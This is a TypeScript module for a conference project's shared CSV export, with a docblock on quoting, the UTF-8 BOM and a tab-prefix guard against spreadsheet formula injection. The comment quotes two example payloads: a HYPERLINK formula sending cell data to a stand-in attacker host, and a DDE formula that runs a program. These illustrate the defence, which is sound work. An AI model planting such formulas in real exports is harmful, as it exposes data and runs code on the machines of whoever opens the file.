/**
 * CSV generation, shared by everything in this project that hands somebody a
 * spreadsheet.
 *
 * ── Why it moved here ───────────────────────────────────────────────────────
 *
 * It was `apps/organizer/src/lib/csv.ts` and nothing else needed it. Exhibitor
 * lead export is on the **website**, which cannot import the dashboard, and the
 * only two ways to give it a CSV writer were a second copy of the escaping or
 * this move. A second copy would have been a second copy of the formula guard
 * below, which is the one piece of this file that is not obvious — so the day
 * the copies drifted would be the day one export stopped being safe and nothing
 * said so. `apps/organizer/src/lib/csv.ts` now re-exports this and keeps only
 * the `Response` helper, which is a web concern rather than a formatting one.
 *
 * Deliberately not a dependency. The whole of RFC 4180 that matters here is
 * "wrap a field in quotes if it contains a comma, a quote or a newline, and
 * double any quote inside it" — about six lines. What a library would not give
 * us is the part below that actually bites.
 *
 * ── ⚠️ Formula injection is the reason this file has a docblock ─────────────
 *
 * A CSV is opened in Excel, and Excel executes any cell beginning `=`, `+`, `-`
 * or `@` as a formula. An attendee who registers as
 *
 *     =HYPERLINK("http://evil.example/"&A1,"Click me")
 *
 * has just written a payload into every export an organizer opens — and the
 * classic form of this, `=cmd|'/c calc'!A1`, runs a program. The attacker needs
 * nothing but a text field on a public registration form, which is exactly what
 * we have. An exhibitor lead export widens that: the note beside a lead is
 * typed at a booth by somebody who is not an organizer at all.
 *
 * The defence is one character: prefix a tab. Excel and Sheets both stop
 * treating the cell as a formula, and both still display the text correctly.
 * Every field goes through `escape()`, so this cannot be forgotten per-column.
 *
 * ── The BOM ─────────────────────────────────────────────────────────────────
 *
 * Excel on Windows reads a UTF-8 CSV as Latin-1 unless the file opens with a
 * byte-order mark. Without it, every accented name in a European conference's
 * attendee list arrives mangled — and the person who notices is the one
 * printing badges.
 */

/** Cells beginning with any of these are interpreted as formulas by spreadsheets. */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

function escape(value: unknown): string {
  if (value === null || value === undefined) return "";

  let s = String(value);

  // Neutralise the formula before quoting, so the guard is inside the quotes
  // and survives the round trip.
  if (FORMULA_LEAD.test(s)) s = `\t${s}`;

  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

export interface Column<T> {
  header: string;
  value: (row: T) => unknown;
}

/**
 * Rows to a CSV string, with a BOM.
 *
 * `\r\n` line endings because RFC 4180 says so and because Excel is the
 * consumer; Numbers and Sheets accept either.
 */
export function toCsv<T>(rows: T[], columns: Column<T>[]): string {
  const head = columns.map((c) => escape(c.header)).join(",");
  const body = rows.map((r) => columns.map((c) => escape(c.value(r))).join(","));
  return `﻿${[head, ...body].join("\r\n")}\r\n`;
}

/**
 * A filename an organizer can find again in six months.
 *
 * `kgc-2027-attendees-2026-08-25.csv` rather than `export.csv` — the fourth
 * copy of `export (3).csv` in a Downloads folder is the reason exports get
 * re-run rather than reused.
 */
export function exportFilename(kind: string, today: Date): string {
  const date = today.toISOString().slice(0, 10);
  return `kgc-2027-${kind}-${date}.csv`;
}
